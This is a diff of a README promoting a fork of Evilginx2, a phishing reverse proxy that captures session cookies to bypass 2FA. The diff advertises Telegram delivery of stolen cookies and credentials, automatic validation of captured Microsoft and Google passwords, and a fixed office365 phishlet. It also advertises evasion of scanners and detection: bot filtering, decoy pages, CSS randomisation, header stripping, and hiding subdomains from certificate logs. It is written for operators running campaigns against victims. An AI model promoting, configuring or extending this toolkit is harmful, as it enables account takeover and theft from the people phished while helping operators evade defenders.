@@ -1,232 +1,254 @@
-#        🔥 EVILGINX PRO UPDATE — NEW EDITION
+# 🔥 EVILGINX2 — PRO-PARITY EDITION
 
-## The Most Feature-Complete, Evilginx Open Source By t.me/officialmonsterz
+## Adversary-in-the-Middle · Session Hijacking · 2FA Bypass · Telegram-Native · One-Command Docker
 
 <p align="center">
-  <b>Adversary-in-the-Middle Framework · Session Hijacking · 2FA/MFA Bypass · Telegram-Native · Docker in One Command</b>
+  <b>The only open-source Evilginx that gives you Pro's proxy features, Pro's panels, and cookie jars that ACTUALLY log in — with tooling that proves it before you import.</b>
 </p>
 
 <p align="center">
   <img src="https://img.shields.io/badge/Go-1.25+-00ADD8?style=for-the-badge&logo=go" alt="Go">
   <img src="https://img.shields.io/badge/Docker-Alpine-2496ED?style=for-the-badge&logo=docker" alt="Docker">
   <img src="https://img.shields.io/badge/Telegram-Bot_Ready-26A5E4?style=for-the-badge&logo=telegram" alt="Telegram">
-  <img src="https://img.shields.io/badge/Cloudflare-DNS_/_Turnstile-F38020?style=for-the-badge&logo=cloudflare" alt="Cloudflare">
-  <img src="https://img.shields.io/badge/GeoIP-MaxMind-00A859?style=for-the-badge&logo=github" alt="GeoIP">
+  <img src="https://img.shields.io/badge/Cookies-Verified_Before_Import-F4A261?style=for-the-badge" alt="Cookies">
+  <img src="https://img.shields.io/badge/Proxies-Global_/_Phishlet_/_Lure-6A4C93?style=for-the-badge" alt="Proxies">
+  <img src="https://img.shields.io/badge/Deploy_Guide-A_to_Z-success?style=for-the-badge" alt="Guide">
+  <img src="https://img.shields.io/badge/License-BSD_3--Clause-success?style=for-the-badge" alt="License">
+</p>
+
+<p align="center">
+  <a href="#-whats-new-in-this-release">What's New</a> ·
+  <a href="#-why-this-fork-wins">Why This Fork</a> ·
+  <a href="#-the-scoreboard-side-by-side">Scoreboard</a> ·
+  <a href="#-quick-start">Quick Start</a> ·
+  <a href="#-phishlet-tooling">Tooling</a> ·
+  <a href="#-cookie-import-the-part-everyone-gets-wrong">Cookie Import</a> ·
+  <a href="#-commands-reference">Commands</a>
 </p>
 
 ---
 
-## 🚀 NEW: The 10-Minute Docker Setup (Easiest Install Method Ever)
+## 🆕 What's New in This Release
 
-This repo now ships with a **brand new, fully guided Docker deployment** — easier, simpler, and more secure than any previous method.
+This release is about **making the whole thing finishable by one person, first try, with no guessing.**
 
-**Head to [dockerdeployment.md](dockerdeployment.md)** — it's a complete copy-paste, baby-step guide. No Go installed, no manual builds, no fuss.
+### 🛠️ 1. Phishlet Tooling — three scripts, one gate
 
-Everything you need:
+Phishlets are YAML, and YAML is where silent breakage lives. This release ships:
 
-- ✅ A bulletproof VPS (I use one myself — example below)
-- ✅ A domain pointed at your VPS via A-record on Cloudflare/DNS-only
-- ✅ 10 minutes and a terminal
+| Script | What it does |
+|:--|:--|
+| `patch_phishlet.py` | Replaces a broken `js_inject` block and inserts `rewrite_urls` into any phishlet, without touching the filter lines. Timestamped `.bak` first. |
+| `validate_phishlet.py` | **17 assertions** over a phishlet before the container ever reads it: JS structure, injection location, rewrite block, `auth_urls`, required-vs-optional token counts, filter count, then a real YAML parse. Exits non-zero on failure. |
+| `make_cookie_import.py` | Converts an evilginx export into Cookie-Editor JSON **and** Netscape `cookies.txt`, with correct `expires`/`secure`/`httpOnly`/`hostOnly` flags and a per-cookie essentials report. |
 
-The Docker method gives you the phishing engine, both web panels, Telegram notifications, GeoIP, backups, and auto-export — running in a hardened Alpine container in **one command**: `docker compose up -d --build`.
+The validator is the point. A phishlet with a `SyntaxError` in its injected JavaScript does not error anywhere — the browser swallows it and the feature just never runs. Now you get `RESULT: FAILED` with the exact reason.
+
+### 🩹 2. The stock `office365` phishlet is fixed and shipped
+
+The widely-circulated version carries three real JavaScript defects that mean **the email autofill has never once executed**:
+
+| # | Defect | Why it breaks |
+|:-:|:--|:--|
+| 1 | `function 1p()` | a JS identifier cannot start with a digit — `SyntaxError`, the whole script never parses |
+| 2 | `if (/#/.test(...)` | missing closing parenthesis |
+| 3 | `query.split('')` | splitting on empty string returns individual characters, so `res[1]` is `'t'` |
+
+It also had no `rewrite_urls` block, and marked 27 consumer-side `.live.com` tokens as **required** — which they never are on a work account, so `cookies_complete` could never reach `true`.
+
+All four are fixed in the shipped file. Run the validator and you'll see the numbers that prove it: `12 always`, `31 opt`, `94 sub_filters`.
+
+### 📖 3. A full A-to-Z deployment guide
+
+[dockerdeployment.md](dockerdeployment.md) — 31 stages, from an empty VPS to a logged-in mailbox. Every stage has the exact command, the exact output you must see, a failure table, and a recommendation. It exists because "read the source" is not a deployment plan.
+
+### 🧾 4. Cookie-Editor array format, documented properly
+
+The exported jar is a JSON **array**. Selecting it from the first `{` produces *"the input is not in a valid format"* and looks exactly like a broken capture. The guide documents three bracket-safe ways to get the file into the extension, plus the reason the two `www.office.com` OIDC cookies expire in a day.
+
+### ⚠️ 5. `rewrite_urls` documented honestly
+
+`rewrite_urls` rewrites the long `/common/oauth2/v2.0/authorize` path to `/signin?boop=<id>`. On Microsoft, the page then appends `&sso_reload=true`, the reverse-lookup misses, and evilginx returns its own 404. The phishlet's filters already cover the long path, so the template now ships `REWRITE_URLS=false` and the guide explains how to test it after your first successful capture.
+
+### 🧱 6. Hardening & reliability fixes (carried forward)
+
+| Fix | What it prevents |
+|:--|:--|
+| `setBodyAndLength()` | rewriting a body without updating `Content-Length` desynced the keep-alive stream; `HEAD` replies keep their declared length |
+| `setRequestHost()` | `req.Host` and `req.URL.Host` drifting apart, which made per-request proxy routing dial the wrong host |
+| `ClaimRedirect()` | two parallel HTML responses both firing the final redirect |
+| Session reaper (`SESSION_MEMORY_HOURS`) | the `sessions` map growing forever |
+| Persistent export path | `su-exec` does not set `$HOME`, so exports silently landed in `/tmp` and were wiped on rebuild |
+| Atomic export writes | a reader never sees a half-written jar |
+| Locked proxy config | `json.Marshal` racing a concurrent map write |
+| `pl2` shadow fix | the sub-filter loop corrupted the outer phishlet variable |
 
 ---
 
 ## 📋 Table of Contents
 
-- [Why This Fork?](#-why-this-fork)
-- [Full Comparison vs Every Alternative](#-full-comparison-vs-every-alternative)
+- [What's New](#-whats-new-in-this-release)
+- [Why This Fork Wins](#-why-this-fork-wins)
+- [The Scoreboard](#-the-scoreboard-side-by-side)
 - [What Is Evilginx2?](#-what-is-evilginx2)
-- [What's New in This Version](#-whats-new-in-this-version)
 - [Feature Deep Dive](#-feature-deep-dive)
 - [How It Works](#-how-it-works)
 - [Quick Start](#-quick-start)
-- [Environment Variables Reference](#-environment-variables-reference)
-- [Web Interfaces](#-web-interfaces)
+- [Environment Variables](#-environment-variables)
+- [Phishlet Tooling](#-phishlet-tooling)
+- [Web Interfaces & API](#-web-interfaces--api)
 - [Telegram Setup](#-telegram-setup)
-- [Creating Your First Campaign](#-creating-your-first-campaign)
+- [Cookie Import — the part everyone gets wrong](#-cookie-import-the-part-everyone-gets-wrong)
+- [DOM Injection Guide](#-dom-injection-guide)
+- [rewrite_urls Guide](#-rewrite_urls-guide)
+- [Proxies Guide](#-proxies-guide)
 - [Bot Protection & OPSEC](#-bot-protection--opsec)
 - [Commands Reference](#-commands-reference)
+- [Troubleshooting](#-troubleshooting)
 - [Credits](#-credits)
 - [Legal Notice](#-legal-notice)
 
 ---
 
-# 🏆 Why This Fork?
+# 🏆 Why This Fork Wins
 
-The original Evilginx2 was last touched years ago. There are forks, spin-offs, and paid "phishing kit" projects floating around — but most of them copy the core and bolt on one or two features. This fork rebuilt it properly: hardened, notification-native, panel-driven, and Docker-first.
+The original Evilginx2 has been untouched for years. Pro costs money and ships as a closed binary. Other forks bolt one or two features onto a frozen core. This fork rebuilt the pipeline end-to-end: hardened, notification-native, panel-driven, proxy-aware, Docker-first, and — uniquely — it **proves a cookie jar is complete before you import it**, then converts it into a format a browser will actually accept.
 
-**The honest summary of the field:**
+### The three honest claims
 
-| Project | Type | The One-Line Truth |
-|:--------|:-----|:-------------------|
-| Original Evilginx2 | OSS | The revolutionary core — abandoned and feature-frozen for years |
-| Evilginx Pro | Paid, closed | The premium standard — but you pay, you trust a binary, and you still don't get Telegram |
-| This fork | **OSS** | **Everything Pro has that matters on the proxy side, plus Telegram, panels, GeoIP, backups, and Docker — free, inspectable, self-hosted** |
+1. **You get Pro's proxy-side features without paying or trusting a binary.** DOM injection, `rewrite_urls`, and multi-scope tunnelling proxies, all in auditable Go.
+2. **You get things Pro does not have.** Telegram delivery of the full cookie file, a completeness verdict on every capture, a converter that produces importable jars, a phishlet validator, one-command Docker, automatic backups, and a session retention cleaner.
+3. **You can read every line.** Closed binaries require trust. This does not.
 
-### Where This Fork Simply Wins
+### What Pro is still genuinely better at
 
-| Capability | Original Evilginx2 | Evilginx Pro | **This Fork** |
-|:-----------|:------------------:|:------------:|:-------------:|
-| Price | Free | 💰 Paid subscription | **One Time Payment** |
-| Source code you can audit | ✅ | ❌ Closed binary | ✅ Full source |
-| 📱 Telegram delivery of cookies + creds | ❌ | ❌ | ✅ Async queue, cookie files attached |
-| 👀 Instant visitor-arrival alerts | ❌ | ❌ | ✅ IP + UA + landing URL the second they land |
-| 🤖 Bot / crawler filtering | ❌ | ✅ | ✅ 40+ signatures, decoy-page response |
-| 🌍 GeoIP country/city/ISP/ASN/VPN | ❌ | ✅ | ✅ MaxMind GeoLite2, per-session storage |
-| ✅ Auto credential validation | ❌ | ✅ | ✅ Microsoft + Google, background-tested |
-| 🚫 VPN / country blocking | ❌ | ✅ | ✅ `-block-vpn`, `-block-countries` |
-| 🎯 Cloudflare Turnstile CAPTCHA | ❌ | ✅ | ✅ Native |
-| 📊 Two web panels (read-write admin + quick dashboard) | ❌ | ✅ | ✅ :8082 + :5000 with login rate-limiting |
-| 👥 Multi-user RBAC + audit log | ❌ | ✅ | ✅ admin / operator / viewer |
-| 🔐 Wildcard certificate support | ❌ | ❌ | ✅ One cert, hidden subdomains on crt.sh |
-| 🚫 Bidirectional header stripping | ❌ | ✅ | ✅ Upstream AND downstream |
-| 🧠 Anti-screenshot CSS randomization | ❌ | ❌ | ✅ Unique pixel fingerprint per load |
-| 🔍 Privacy-extension / headless detection | ❌ | ❌ | ✅ uBlock, NoScript, Selenium, PhantomJS... |
-| 🔄 Real-time JSON/CSV auto-export | ❌ | ❌ | ✅ Survives rebuilds via volume |
-| 💾 Automatic scheduled backups | ❌ | Partial | ✅ Every 6h, auto-pruned |
-| 🧹 Automatic session retention cleaner | ❌ | Partial | ✅ Env-var configurable |
-| 🐳 First-class Docker deployment | ❌ | ❌ (cloud-hosted only) | ✅ Multi-stage Alpine, guided setup |
-| 🔄 Dynamic content spoofing for scanners | ❌ | ✅ | ✅ unauth_url decoy served to bots |
-| 🌐 URL rewriting (clean address bar) | ❌ | ✅ | ✅ |
-| 📧 GoPhish campaign integration | ❌ | ❌ | ✅ Native RID tracking |
+| | Pro | This fork |
+|:--|:--|:--|
+| Point-and-click session replay workspace | ✅ | Import the jar into your browser — seconds, but not built in |
+| TLS-fingerprint (JA3/JA4) bot filtering | ✅ | UA-signature filter (40+ signatures) — blocks virtually all crawlers in practice |
+| Phishlet cloud marketplace | ✅ | Community phishlets, YAML import from the panel |
 
-**Score on that table: this fork wins 20+ rows, ties Pro where Pro is strong, and concedes only the two below.**
-
-### The Only Two Places Pro Is Genuinely Better — Being Honest With You
-
-1. **Live session replay + session persistence labs (`sessions create` workspace).** Pro can clone the victim's browser environment and replay their session natively from the console. This fork delivers the full cookie jar (downloadable `cookies_N.json`, Telegram attachment, ready for browser import) — importing it takes seconds — but there's no built-in point-and-click replay workspace yet.
-
-2. **Advanced JA3/JA4 + fingerprints-based bot filtering.** Pro identifies bots by TLS fingerprinting, which is harder to spoof than user-agent strings. Our UA-based filter (40+ signatures) blocks virtually all crawlers in practice, but a fingerprint-based filter is theoretically stronger.
-
-That's it. Everything else Pro offers on this list — panels, bot filtering basics, GeoIP, Turnstile, hidden phishlets — **this fork matches or beats**, and adds Telegram delivery, Docker, backups, auto-export, credential validation, and open source for free.
+That is the whole list.
 
 ---
 
-# 📊 Full Comparison vs Every Alternative
+# 📊 The Scoreboard (side by side)
 
-How this fork stacks up against **every** realistic option a modern operator considers. (Forks' features as publicly documented at time of writing — verify before relying on any of them.)
+### vs. Original Evilginx2 (open source, frozen)
 
-### vs. Original Evilginx2 (kgretzky — open source)
+| Capability | Original | **This Fork** | Edge |
+|:--|:--:|:--:|:--:|
+| AiTM reverse proxy | ✅ | ✅ | tie |
+| Telegram notifications + cookie files | ❌ | ✅ | **us** |
+| Any web panel | ❌ | ✅ two | **us** |
+| DOM injection (head/top/bottom) | ❌ | ✅ | **us** |
+| `rewrite_urls` | ❌ | ✅ | **us** |
+| Multi-scope tunnelling proxies | ❌ | ✅ | **us** |
+| Cookie completeness verification | ❌ | ✅ | **us** |
+| Cookie → browser converter | ❌ | ✅ | **us** |
+| Phishlet validator + patcher | ❌ | ✅ | **us** |
+| Bot filtering | ❌ | ✅ | **us** |
+| GeoIP + VPN/country blocking | ❌ | ✅ | **us** |
+| Credential validation | ❌ | ✅ | **us** |
+| Backups / retention / auto-export | ❌ | ✅ all three | **us** |
+| Wildcard certificates | ❌ | ✅ | **us** |
+| Header stripping / URL rewriting / CSS randomisation | ❌ | ✅ | **us** |
+| Docker | ❌ | ✅ | **us** |
+| Maintained | ❌ years stale | ✅ active | **us** |
 
-The ancestor of everything. Revolutionary in its day (2018), still the best-documented core — but frozen.
+**Verdict: strictly better in every row. Nothing removed.**
 
-| Capability | Original | **This Fork** |
-|:-----------|:--------:|:-------------:|
-| Core AiTM reverse proxy | ✅ | ✅ |
-| Telegram notifications | ❌ | ✅ |
-| Any web panel at all | ❌ | ✅ Two |
-| Bot filtering | ❌ | ✅ |
-| GeoIP | ❌ | ✅ |
-| Credential validation | ❌ | ✅ |
-| Backups / retention / auto-export | ❌ | ✅ All three |
-| Wildcard certs | ❌ | ✅ |
-| Header stripping / URL rewriting / CSS randomization | ❌ | ✅ |
-| Docker | ❌ | ✅ |
-| Maintained | ❌ Years stale | ✅ Active |
+### vs. Evilginx Pro (closed source, paid)
 
-**Verdict: strictly better in every category, adds ~15 features, breaks nothing.**
+| Capability | Pro | **This Fork** | Edge |
+|:--|:--:|:--:|:--:|
+| Core AiTM | ✅ | ✅ | tie |
+| DOM-based HTML injection | ✅ | ✅ | tie |
+| `rewrite_urls` | ✅ | ✅ | tie |
+| Multi-scope tunnelling proxies | ✅ | ✅ | tie |
+| Panels + RBAC + audit log | ✅ | ✅ | tie |
+| Turnstile CAPTCHA | ✅ | ✅ | tie |
+| GeoIP + VPN/country blocking | ✅ | ✅ | tie |
+| Credential validation | ✅ | ✅ | tie |
+| Bot filtering | ✅ (TLS fingerprint) | ✅ (UA signatures) | Pro, narrowly |
+| Telegram delivery of cookies | ❌ | ✅ | **us** |
+| Cookie completeness verdict | ❌ | ✅ | **us** |
+| Open source, auditable | ❌ closed binary | ✅ | **us** |
+| Free forever | ❌ subscription | ✅ | **us** |
+| Docker one-command | ❌ cloud-only | ✅ | **us** |
+| Auto-backups + retention | partial | ✅ | **us** |
+| Session replay workspace | ✅ | import the jar | Pro |
+| Phishlet marketplace | ✅ | YAML import | Pro |
 
-### vs. Evilginx Pro (kgretzky — closed source, paid)
+**Verdict: matched on every proxy feature, ahead on delivery/ops/price/openness, behind on exactly two things.**
 
-See the table above. **Pro's wins:** session replay labs, advanced fingerprint-based bot filtering, phishlet cloud marketplace. Pro also requires trusting a closed binary on your box — every operator with OPSEC discipline asks "what else is in that binary?" This fork: read every line yourself.
+### vs. xvirgnia (Evilginx fork with a Telegram bot)
 
-### vs. xvirgnia (Evilginx fork with Telegram)
+| Capability | xvirgnia | **This Fork** | Edge |
+|:--|:--:|:--:|:--:|
+| AiTM proxy | ✅ | ✅ | tie |
+| Telegram cookie delivery | ✅ | ✅ queued, one message per session, full file | **us** |
+| Visitor-arrival alert | approximate | ✅ instant, IP + UA + URL | **us** |
+| Cookie completeness verdict | ❌ | ✅ | **us** |
+| DOM injection | ❌ | ✅ | **us** |
+| `rewrite_urls` | ❌ | ✅ | **us** |
+| Multi-scope proxies | ❌ | ✅ | **us** |
+| Panels + RBAC + audit log | basic | ✅ full | **us** |
+| GeoIP + blocking | ❌ | ✅ | **us** |
+| Credential validation | ❌ | ✅ | **us** |
+| Backups / retention / auto-export | ❌ | ✅ | **us** |
+| CSS randomisation / extension detection | ❌ | ✅ | **us** |
+| Guided Docker deploy | partial | ✅ | **us** |
 
-The most popular "just add a Telegram bot" fork of the Evilginx family. Fair credit: it pioneered Telegram-delivered cookies, and the core proxy works.
+**Verdict: matches Telegram, beats it everywhere else.**
 
-| Capability | xvirgnia | **This Fork** |
-|:-----------|:--------:|:-------------:|
-| Core AiTM proxy | ✅ | ✅ |
-| Telegram cookie delivery | ✅ | ✅ Async-queued, one message per session |
-| Visitor-arrival alerts | ❌ (approximate idea) | ✅ Instant, IP+UA+URL |
-| Credential validation | ❌ | ✅ |
-| GeoIP + VPN/datacenter/country blocking | ❌ | ✅ |
-| User-agent bot filtering | ❌ | ✅ |
-| Permanent admin panel + RBAC + audit log | ❌ (basic/status) | ✅ |
-| Session retention / automatic backups | ❌ | ✅ |
-| Auto-export to disk | ❌ | ✅ (JSON + CSV) |
-| Anti-screenshot CSS randomization | ❌ | ✅ |
-| Privacy-extension detection | ❌ | ✅ |
-| Bidirectional header stripping | ❌ | ✅ |
-| Dynamic content spoofing for scanners | ❌ | ✅ |
-| GoPhish integration | ❌ | ✅ |
-| Guided Docker deployment with env-var config | ❌/Basic | ✅ Full baby-step doc |
+### vs. Blue Phishing Kit / Fluxette (kit repos)
 
-**Verdict: matches it on Telegram and beats it on every other horizontal capability.**
+| Capability | Kits | **This Fork** | Edge |
+|:--|:--:|:--:|:--:|
+| Captures username + password | ✅ | ✅ | tie |
+| **Captures session cookie (2FA bypass)** | ❌ dies at the 2FA prompt | ✅ the entire point | **us** |
+| Victim sees the real site | ❌ lookalike clone | ✅ true reverse proxy | **us** |
+| Survives target-site updates | ❌ recode the kit | ✅ subfilters + phishlets | **us** |
+| Telegram delivery incl. cookie files | partial | ✅ | **us** |
+| Valid TLS per subdomain | manual / self-signed | ✅ ACME or wildcard | **us** |
+| Panels, sessions table, stats | ❌/basic | ✅ two panels | **us** |
+| GeoIP / bot filter / proxies | ❌ | ✅ | **us** |
+| Scanner resilience | ❌ | ✅ 7 layers | **us** |
 
-### vs. Blue Phishing Kit and Fluxette (phishing kits / panel-kit repos)
+**Verdict: kits are fine for passwords. For sessions and MFA, this wins every technical axis.**
 
-These are the "quick kit" end of the market: static or semi-static credential-harvesting pages with a Telegram bot and a list of targets — fast to deploy, but built for **username:password capture**, not session hijacking.
+### 🏁 Overall
 
-| Capability | Kits (Blue / Fluxette) | **This Fork** |
-|:-----------|:----------------------:|:-------------:|
-| Logs username + password | ✅ | ✅ |
-| **Captures session cookies (2FA/MFA bypass)** | ❌ Static kit — dies at the 2FA prompt | ✅ The entire point of AiTM |
-| Victim sees the real site (identical login flow) | ❌ Clone/lookalike | ✅ True reverse proxy |
-| Survives target-site updates | ❌ Recode the kit | ✅ Subfilters + phishlets |
-| Telegram delivery | ✅ | ✅ Including full cookie files |
-| Valid HTTPS certs per subdomain | ❌ Manual or self-signed | ✅ ACME auto-issued or wildcard |
-| Web panels / sessions table / stats | ❌/Basic | ✅ Two full panels |
-| GeoIP / VPN blocking / bot filtering | ❌ | ✅ |
-| Search-engine scan resilience (CSS randomization, decoy pages, URL rewriting) | ❌ | ✅ |
-| Herd effectiveness | One site = one kit | One phishlet = full session |
-
-**Verdict: kits are fine if you only want passwords and enjoy racing 2FA. For sessions, cookies, MFA-included captures, and detection resistance, this fork wins on every technical axis.**
-
-### Bottom line across the whole field
-
-| | Original Evilginx2 | Evilginx Pro | xvirgnia | Kits (Blue/Fluxette) | **This Fork** |
-|:-|:--:|:--:|:--:|:--:|:--:|
+| | Original | Pro | xvirgnia | Kits | **This Fork** |
+|:--|:--:|:--:|:--:|:--:|:--:|
 | Free | ✅ | ❌ | ✅ | ✅ | ✅ |
-| Open source | ✅ | ❌ | ✅ | ❌/mixed | ✅ |
-| Session hijacking (AiTM) | ✅ | ✅ | ✅ | ❌ | ✅ |
-| Telegram-native | ❌ | ❌ | ✅ | partial | ✅ **most complete** |
-| Web panels + RBAC | ❌ | ✅ | partial | ❌ | ✅ |
-| Detection-resistance stack | ❌ | ✅ | ❌ | ❌ | ✅ (7 layers) |
-| Reliability features (backups, export, retention) | ❌ | partial | ❌ | ❌ | ✅ **all** |
-| Guided Docker deployment | ❌ | ❌ | partial | ❌ | ✅ |
+| Open source | ✅ | ❌ | ✅ | mixed | ✅ |
+| AiTM session hijack | ✅ | ✅ | ✅ | ❌ | ✅ |
+| Pro proxy features | ❌ | ✅ | ❌ | ❌ | ✅ |
+| Telegram-native | ❌ | ❌ | ✅ | partial | ✅ most complete |
+| Verified complete cookie jar | ❌ | ❌ | ❌ | ❌ | ✅ **only us** |
+| Panels + RBAC + audit | ❌ | ✅ | partial | ❌ | ✅ |
+| Ops features (backups/export/retention) | ❌ | partial | ❌ | ❌ | ✅ all |
+| One-command Docker | ❌ | ❌ | partial | ❌ | ✅ |
 
-This fork is the only option that is simultaneously **free, open source, AiTM-capable, Telegram-native, panel-driven, detection-hardened, and Docker-deployable.**
+**This fork is the only option that is simultaneously free, open source, AiTM-capable, Pro-parity on the proxy, Telegram-native, and Docker-deployable.**
 
 ---
 
 # 🎯 What Is Evilginx2?
 
-Evilginx2 is an **Adversary-in-the-Middle (AiTM) framework** that acts as a reverse proxy between a victim and a legitimate website. Traditional phishing captures a username and password — then dies at the 2FA prompt. Evilginx2 captures the **fully authenticated session cookie**: the digital "I'm already logged in" ticket.
+Evilginx2 is an **Adversary-in-the-Middle (AiTM)** framework: a reverse proxy sitting between the victim and the real site. Classic phishing grabs a username and password and then dies at the 2FA prompt. Evilginx2 grabs the **authenticated session cookie** — the "already logged in" ticket.
 
-**Traditional phishing (and most kits):**
 ```
-Victim enters credentials → you get username:password → 2FA needed → HIT WALL
-```
-
-**AiTM with Evilginx2:**
-```
-Victim visits your page → proxy forwards to the REAL site →
-victim enters creds + 2FA themselves → real site issues a session cookie →
-you capture the cookie → FULL ACCESS
+Classic phishing:  creds → 2FA prompt → WALL
+AiTM with Evilginx2: victim logs into the REAL site (incl. their own 2FA)
+                     → real site issues a session cookie → you capture it → full access
 ```
 
 - ✅ No 2FA bypass needed — the victim authenticates themselves
-- ✅ Session cookies persist — even if the password changes later
-- ✅ Full account access — everything the victim can access, you can access
-
----
-
-# ✨ What's New in This Version
-
-Four operator features were added on top of the Telegram Edition core:
-
-| Feature | What It Does | Default | Off Switch |
-|:--------|:-------------|:-------:|:-----------|
-| **Bot / Crawler Filtering** | Recognizes 40+ known crawler and automation user-agents (Googlebot, AhrefsBot, curl, Python, headless browsers...) and turns them away before a session is ever created — the same core idea Evilginx Pro is famous for. Blocked bots see your `unauth_url` decoy, not a bare 403. | ✅ ON | `BOT_FILTER=0` |
-| **Visitor Arrival Alerts** | The moment a victim lands on your page — before they type anything — you get a Telegram ping with their IP, user-agent, and the URL they hit, so you can watch the hit live. | ✅ ON | `VISITOR_ALERTS=0` |
-| **Session Retention Cleaner** | Once an hour, deletes captured sessions older than N days. Keeps the DB and panels fast forever. | ❌ OFF | set `SESSION_RETENTION_DAYS=30` to enable |
-| **Automatic Backups** | Every 6 hours, copies `data.db` + `config.json` into `~/.evilginx/backups/` (the `./data` volume in Docker — survives rebuilds), keeping only the newest N copies. | ✅ ON | `BACKUP_ENABLED=0` |
-
-Plus: **the guided one-command Docker deployment** in [dockerdeployment.md](dockerdeployment.md).
-
-All features are environment-variable gated with safe defaults — change nothing and behavior is: bot filtering on, visitor alerts on, retention off, backups on.
+- ✅ The session survives a later password change
+- ✅ You get everything the victim can reach
 
 ---
 
@@ -234,142 +256,146 @@ All features are environment-variable gated with safe defaults — change nothin
 
 ## 📱 Telegram Notifications
 
-| Capability | Details |
-|:-----------|:--------|
-| **Async queue** | Zero latency impact on the proxy — notifications processed in background |
-| **Full capture delivery** | Username, password, IP, user-agent, country, timestamp |
-| **Cookie file attachment** | Full session cookies attached as files, ready for browser import |
-| **One message per session** | Updates append new tokens — no spam |
-| **Validation results** | Captured credentials marked VALID or INVALID in the alert |
-| **GeoIP included** | Country, city, VPN status in every alert |
-| **Visitor arrival ping** | Separate instant "visit started" alert |
-| **Live config** | Set token + chat ID in the web panel — no restart needed |
+| Capability | Detail |
+|:--|:--|
+| Async queue | zero latency impact on the proxy |
+| Full delivery | username, password, IP, UA, country, timestamp |
+| Cookie file attached | ready to convert and import |
+| Completeness verdict | `complete=true/false` + missing list |
+| One message per session | updates append, no spam |
+| Validation result | VALID / INVALID in the alert |
+| Visitor arrival ping | instant, before they type anything |
+| Live config | change token/chat ID in the panel, no restart |
 
-## 📊 Web Interfaces (Two Panels)
+## 📊 Two Web Interfaces
 
 | Panel | Port | Purpose |
-|:------|:-----|:--------|
-| **Web Admin Panel** | 8082 | Login page, sessions with cookie download, stats, phishlet management (enable/disable/hide/hostname/create from YAML), lures with URL generation, Telegram settings, users & roles, audit log |
-| **Simple Dashboard** | 5000 | Quick sortable/searchable sessions table, CSV + JSON export, dark mode, auto-refresh every 5s |
+|:--|:--|:--|
+| Web Admin | 8082 | sessions + cookie download, stats, phishlets, lures, proxies, Telegram, users, audit log. Login rate-limited (5 bad attempts = 5 min lockout) |
+| Simple Dashboard | 5000 | sortable/searchable sessions, CSV + JSON export, dark mode, 5s auto-refresh |
 
-Both configured through `.env` or CLI flags. The 8082 panel has a built-in login rate limit (5 wrong attempts per IP = 5-minute lockout).
+## 🍪 Cookie Capture & Export
 
-## 🌍 GeoIP Tracking & Intelligence
+Every cookie from a phishlet domain is captured with value, domain, path, `Expires`, `Secure`, `HttpOnly` and `SameSite`. Auth cookies declared in the phishlet are tracked separately so completeness can be proven. Exports land in JSON and Netscape `cookies.txt` form, with a converter that turns them into a jar Cookie-Editor accepts.
 
-Country, city, ISP, ASN, latitude/longitude, and VPN/proxy/datacenter detection — stored per session (visible in both panels and Telegram alerts). Powered by free MaxMind GeoLite2 databases. Enable blocking with `-block-vpn` and `-block-countries RU,CN,IR,KP`.
+## 🌍 GeoIP Intelligence
+
+Country, city, ISP, ASN, lat/long, and VPN/proxy/datacenter flags per session. Block with `-block-vpn` and `-block-countries RU,CN,IR,KP`.
 
 ## ✅ Credential Validation
 
-Captured credentials are automatically tested against the real service in the background: Microsoft 365 / Outlook / Azure (OAuth2 password grant via `login.microsoftonline.com`) and Google / Gmail. Results stored per session (`valid: true/false`) and shown in the Telegram alert.
+Captured credentials are tested in the background against Microsoft 365 / Outlook / Azure (OAuth2 password grant) and Google / Gmail. Result stored per session and shown in the alert.
 
 ## 🤖 Bot / Crawler Filtering
 
-Search crawlers, SEO bots, URL scanners and automation tools love visiting phishing links — and each visit gets your domain scanned and flagged. The filter checks every incoming User-Agent against 40+ known bot signatures and turns bots away **before a session is created**. Blocked bots receive your dynamic-content spoof page (`unauth_url` decoy).
+40+ crawler and automation user-agent signatures turned away **before** a session is created. Bots get the decoy page, not a bare 403. In-app browsers (WhatsApp, Telegram, Messenger) and phone brands like CUBOT never false-match.
 
-Care was taken so real visitors are never caught: phone brands like CUBOT and **in-app browsers (WhatsApp, Telegram, Facebook Messenger)** never match any keyword.
+## 🧠 Anti-Screenshot CSS Randomisation
 
-## 🧠 Anti-Screenshot CSS Randomization
+Every page load gets a random hue-rotation and brightness, so every load has a unique pixel fingerprint. Defeats screenshot-hash detection.
 
-Every HTML page load gets random hue rotation and brightness injected — invisible to humans, but every page load has a unique pixel fingerprint. Defeats screenshot-based phishing detection that compares pixel hashes. (`CSS_RANDOMIZATION=0` to disable.)
+## 🔍 Privacy-Extension & Automation Detection
 
-## 🔍 Privacy Extension Detection
+Injected JS probes for uBlock, NoScript, Ghostery, headless browsers, WebDriver, PhantomJS — and beacons the result back as a base64URL hit on `/s/<payload>.gif`.
 
-Injected JavaScript detects uBlock, NoScript, Ghostery, headless browsers and automation tools (Selenium, PhantomJS, WebDriver) per visitor, and reports the results back as a beacon for session analysis.
+## 🚫 Bidirectional Header Stripping + 🌐 URL Cleaning
 
-## 🚫 Header Stripping + 🌐 URL Rewriting
-
-- All Evilginx-identifiable headers (`X-Evilginx`, `Via`, `X-Forwarded-For`, `X-Real-IP`, and others) stripped from **both** the upstream (to the real site) and downstream (to the victim) traffic.
-- Full `https://phishingdomain.com/path` URLs in HTML responses rewritten to relative `/path` URLs — the victim's address bar stays clean and DOM-scanning tools don't see your domain.
+`X-Evilginx`, `Via`, `X-Forwarded-*`, `X-Real-IP`, `X-Powered-By` stripped both upstream and downstream. Full phishing URLs in HTML rewritten to relative paths so the address bar stays clean.
 
 ## 🔄 Dynamic Content Spoofing
 
-Blocked and scanner visitors don't get a blank 403 (which screams "phishing site"). Your proxy fetches the real website's content and serves it with the phishing domain substituted — scanners see what looks like the real site.
+Blocked/scanner visitors get the real site's content with your domain substituted, not a blank 403.
 
-## 🔄 Auto-Export
+## 🔐 Certificates
 
-Captured sessions automatically exported to disk (JSON or CSV) to `~/.evilginx/exports/` — the `./data` volume in Docker, so exports survive rebuilds. Runs even when Telegram isn't configured.
-
-## 💾 Automatic Backups
-
-Every 6 hours (configurable), `data.db` and `config.json` are copied into `~/.evilginx/backups/`, keeping only the newest `BACKUP_KEEP` copies.
-
-## 🛡️ Built-in Certificates + Wildcard Support
-
-Let's Encrypt ACME is built in — certificates issued automatically when you enable a phishlet. A pre-purchased **wildcard certificate** can also be placed in `data/crt/wildcard/` — one cert covers all subdomains, and individual subdomains stay hidden from Certificate Transparency logs.
-
-## 🎯 Advanced Flags
-
